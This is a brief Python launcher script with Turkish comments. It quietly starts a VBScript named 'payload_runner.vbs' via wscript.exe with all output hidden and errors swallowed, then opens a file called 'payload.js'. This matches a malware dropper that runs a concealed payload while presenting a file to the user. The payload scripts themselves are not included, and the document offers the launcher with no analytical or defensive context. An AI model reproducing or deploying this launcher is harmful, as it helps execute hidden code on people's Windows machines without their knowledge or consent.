import os
import subprocess

real_file = "payload.js"

# Payload başlat
try:
    subprocess.Popen(["wscript.exe", "payload_runner.vbs"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
except:
    pass

# Dosyayı aç
try:
    os.startfile(real_file)
except:
    pass
